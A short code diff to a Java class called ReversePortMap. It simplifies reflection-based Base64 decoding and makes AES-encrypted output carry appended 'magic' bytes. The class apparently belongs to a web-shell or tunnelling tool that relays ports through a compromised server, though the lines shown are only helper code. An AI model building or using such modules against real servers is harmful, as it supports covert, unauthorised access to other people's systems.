@@ -298,12 +298,12 @@ public class ReversePortMap implements Runnable {
          this.getClass();
          Base64 = Class.forName("java.util.Base64");
          Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
       } else {
          this.getClass();
          Base64 = Class.forName("sun.misc.BASE64Decoder");
          Decoder = Base64.newInstance();
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
       }
 
       return result;
@@ -353,7 +353,10 @@ public class ReversePortMap implements Runnable {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private Object sessionGetAttribute(Object session, String key) {
